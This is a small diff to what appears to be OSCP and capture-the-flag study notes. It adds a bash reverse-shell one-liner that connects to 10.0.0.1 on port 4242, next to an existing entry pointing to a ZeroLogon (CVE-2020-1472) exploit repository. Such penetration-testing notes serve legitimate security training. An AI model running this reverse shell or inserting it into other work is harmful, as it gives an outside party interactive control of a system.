@@ -2,6 +2,11 @@
 
 # OSCP / CTF
 
+BASH TCP SHELL
+```
+bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
+```
+
 ZeroLogon - CVE-2020-1472
 ```
 https://github.com/SecuraBV/CVE-2020-1472
